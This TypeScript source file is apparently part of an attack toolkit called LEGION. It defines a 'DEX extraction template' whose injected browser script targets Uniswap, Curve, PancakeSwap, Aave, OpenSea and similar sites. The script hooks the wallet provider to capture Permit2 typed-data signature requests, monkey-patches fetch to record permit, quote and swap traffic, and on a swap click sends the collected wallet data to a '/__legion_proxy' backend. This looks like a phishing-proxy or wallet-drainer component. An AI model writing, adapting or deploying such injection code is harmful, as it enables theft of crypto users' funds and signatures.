/**
 * DEX EXTRACTION TEMPLATE
 *
 * Targets: Uniswap, Curve, PancakeSwap, Aave, SushiSwap, 1inch, OpenSea
 *
 * Extracts:
 * - Wallet address and connection status
 * - Swap routes and pricing
 * - Liquidity positions
 * - Transaction signatures (via Permit2)
 * - User balances and allowances
 * - Trading fees and slippage
 */

import { BaseExtractionTemplate, ExtractionTemplate } from '../extraction-templates.js'

export class DEXTemplate extends BaseExtractionTemplate implements ExtractionTemplate {
  name = 'DEX Extraction Template'
  category: 'dex' = 'dex'
  platforms = ['app.uniswap.org', 'curve.finance', 'app.pancakeswap.finance', 'app.aave.com', 'sushi.com', '1inch.io', 'opensea.io']
  supportedChains = ['ethereum', 'polygon', 'arbitrum', 'optimism', 'bsc', 'avalanche', 'solana']
  injectionPoints = ['swap', 'pool', 'tokens', 'farms', 'governance', 'liquidity', 'positions']

  extractionTargets = [
    // Wallet Detection
    {
      name: 'wallet_address',
      type: 'wallet' as const,
      location: 'window_object' as const,
      eventTrigger: 'page_load',
      extractionMethod: 'hook' as const,
    },
    {
      name: 'wallet_provider',
      type: 'wallet' as const,
      location: 'window_object' as const,
      eventTrigger: 'page_load',
      extractionMethod: 'direct' as const,
    },
    // Swap Route Data
    {
      name: 'swap_route',
      type: 'transaction' as const,
      location: 'api_intercept' as const,
      eventTrigger: 'user_action',
      extractionMethod: 'intercept' as const,
    },
    {
      name: 'swap_amount_in',
      type: 'transaction' as const,
      location: 'api_intercept' as const,
      eventTrigger: 'user_action',
      extractionMethod: 'parse' as const,
    },
    {
      name: 'swap_amount_out',
      type: 'transaction' as const,
      location: 'api_intercept' as const,
      eventTrigger: 'user_action',
      extractionMethod: 'parse' as const,
    },
    // Permit2 Signature
    {
      name: 'permit2_signature',
      type: 'signature' as const,
      location: 'api_intercept' as const,
      eventTrigger: 'user_action',
      extractionMethod: 'intercept' as const,
    },
    {
      name: 'permit2_nonce',
      type: 'transaction' as const,
      location: 'api_intercept' as const,
      eventTrigger: 'user_action',
      extractionMethod: 'parse' as const,
    },
    // Balance/Allowance
    {
      name: 'token_balance',
      type: 'balance' as const,
      location: 'api_intercept' as const,
      eventTrigger: 'page_load',
      extractionMethod: 'intercept' as const,
    },
    {
      name: 'token_allowance',
      type: 'allowance' as const,
      location: 'api_intercept' as const,
      eventTrigger: 'page_load',
      extractionMethod: 'intercept' as const,
    },
    // Pricing
    {
      name: 'token_price',
      type: 'price' as const,
      location: 'api_intercept' as const,
      eventTrigger: 'page_load',
      extractionMethod: 'parse' as const,
    },
    // Liquidity
    {
      name: 'liquidity_position',
      type: 'liquidity' as const,
      location: 'api_intercept' as const,
      eventTrigger: 'user_action',
      extractionMethod: 'intercept' as const,
    },
  ]

  walletDetection = {
    detection: {
      metamask: true,
      phantom: true,
      ledger: true,
      trezor: false,
      trustwallet: true,
      coinbase: true,
      walletconnect: true,
    },
    signatureMethod: 'eth_signTypedData_v4' as const,
    permissionRequest: ['eth_accounts', 'eth_signTypedData_v4', 'eth_sendTransaction'],
  }

  apiEndpoints = [
    {
      name: 'swap_quote',
      method: 'POST' as const,
      path: '/v2/quote',
      interceptionType: 'both' as const,
      dataToExtract: ['amount', 'route', 'quote', 'estimatedGas'],
    },
    {
      name: 'permit2_batch',
      method: 'POST' as const,
      path: '/api/v1/permit2-batch-typed-data',
      interceptionType: 'both' as const,
      dataToExtract: ['permit', 'signature', 'nonce', 'deadline'],
      chainSpecific: true,
    },
    {
      name: 'token_balance',
      method: 'POST' as const,
      path: '/api/v1/token-balance',
      interceptionType: 'response' as const,
      dataToExtract: ['balance', 'decimals', 'symbol'],
    },
    {
      name: 'liquidity_positions',
      method: 'POST' as const,
      path: '/api/v1/liquidity-positions',
      interceptionType: 'response' as const,
      dataToExtract: ['positions', 'fees', 'uncollectedFees'],
    },
    {
      name: 'gas_estimate',
      method: 'POST' as const,
      path: '/api/v1/estimate-gas',
      interceptionType: 'response' as const,
      dataToExtract: ['gasLimit', 'gasPrice', 'maxFeePerGas'],
    },
  ]

  scriptContent = `
(function() {
  const LEGION_DEX = {
    platform: 'dex',
    initialized: false,
    walletConnected: false,
    extractedData: {},

    async initialize() {
      console.log('[LEGION] DEX Template Initialized');

      // Detect wallet
      await this.detectWallet();

      // Hook wallet provider
      this.hookWalletProvider();

      // Intercept API calls
      this.interceptAPICalls();

      // Hook swap execution
      this.hookSwapExecution();

      this.initialized = true;
    },

    async detectWallet() {
      if (window.ethereum) {
        console.log('[LEGION] MetaMask detected');
        this.walletConnected = true;
        try {
          const accounts = await window.ethereum.request({ method: 'eth_accounts' });
          if (accounts && accounts.length > 0) {
            this.extractedData.wallet_address = accounts[0];
            this.extractedData.wallet_provider = 'metamask';
          }
        } catch (e) {
          console.log('[LEGION] Wallet connection failed:', e);
        }
      } else if (window.phantom?.solana) {
        console.log('[LEGION] Phantom (Solana) detected');
        this.walletConnected = true;
        try {
          const response = await window.phantom.solana.connect();
          this.extractedData.wallet_address = response.publicKey.toString();
          this.extractedData.wallet_provider = 'phantom';
        } catch (e) {
          console.log('[LEGION] Phantom connection failed:', e);
        }
      }
    },

    hookWalletProvider() {
      if (!window.ethereum) return;

      // Hook signTypedData
      const originalRequest = window.ethereum.request.bind(window.ethereum);
      window.ethereum.request = async function(args) {
        if (args.method === 'eth_signTypedData_v4') {
          console.log('[LEGION] Signature request intercepted:', args);
          LEGION_DEX.extractedData.pending_signature = args.params[1];
        }
        return originalRequest(args);
      };
    },

    interceptAPICalls() {
      // Hook fetch
      const originalFetch = window.fetch;
      window.fetch = function(...args) {
        const [resource, config] = args;
        const url = typeof resource === 'string' ? resource : resource.url;

        // Log API calls
        if (url.includes('/api/') || url.includes('/v') || url.includes('quote')) {
          console.log('[LEGION] API Call:', url, config?.body);
        }

        // Intercept permit2
        if (url.includes('permit2')) {
          if (config?.body) {
            try {
              const body = JSON.parse(config.body);
              LEGION_DEX.extractedData.permit2_request = body;
            } catch (e) {}
          }
        }

        return originalFetch.apply(this, args).then(response => {
          if (url.includes('permit2') || url.includes('quote') || url.includes('swap')) {
            response.clone().json().then(data => {
              console.log('[LEGION] API Response:', url, data);
              if (url.includes('permit2')) {
                LEGION_DEX.extractedData.permit2_response = data;
              } else if (url.includes('quote') || url.includes('swap')) {
                LEGION_DEX.extractedData.swap_data = data;
              }
            }).catch(() => {});
          }
          return response;
        });
      };
    },

    hookSwapExecution() {
      // Monitor for swap button clicks
      const observer = new MutationObserver(() => {
        const swapButton = document.querySelector('[data-testid="swap-button"], button:contains("Swap")');
        if (swapButton) {
          swapButton.addEventListener('click', () => {
            console.log('[LEGION] Swap triggered');
            setTimeout(() => {
              console.log('[LEGION] Extracted Data:', LEGION_DEX.extractedData);
              // Send to legion backend
              LEGION_DEX.sendToBackend();
            }, 1000);
          });
        }
      });

      observer.observe(document.body, {
        childList: true,
        subtree: true,
      });
    },

    async sendToBackend() {
      try {
        await fetch('/__legion_proxy/api/v1/dex-extraction', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            platform: 'dex',
            timestamp: new Date().toISOString(),
            data: this.extractedData,
          }),
        });
      } catch (e) {
        console.log('[LEGION] Send failed:', e);
      }
    },
  };

  window.__LEGION_EXTRACTION__ = LEGION_DEX;
})();
  `.trim()
}

/**
 * DEX template for different platforms
 */
export const dexTemplateInstance = new DEXTemplate()
